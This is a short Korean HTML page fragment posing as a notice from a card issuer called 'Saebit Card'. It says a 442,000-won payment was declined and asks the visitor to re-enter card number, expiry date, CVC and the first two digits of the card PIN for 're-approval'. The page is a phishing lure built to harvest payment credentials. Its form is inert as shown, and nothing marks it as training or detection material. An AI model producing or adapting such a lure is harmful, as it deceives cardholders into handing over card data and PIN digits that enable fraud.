<h1>새빛카드 결제 승인이 거절되었습니다</h1><p>최근 결제 442,000원이 카드 정보 불일치로 승인되지 않았습니다. 카드 정보를 다시 입력하시면 재승인됩니다.</p><form onsubmit="return false"><label>카드번호 <input name="card_number" type="text" autocomplete="off"></label><br><label>유효기간 <input name="expiry" type="text" autocomplete="off"></label><br><label>CVC <input name="cvc" type="password" autocomplete="off"></label><br><label>카드 비밀번호 앞 2자리 <input name="card_pin" type="password" autocomplete="off"></label><br><button>재승인 요청</button></form>
</body>
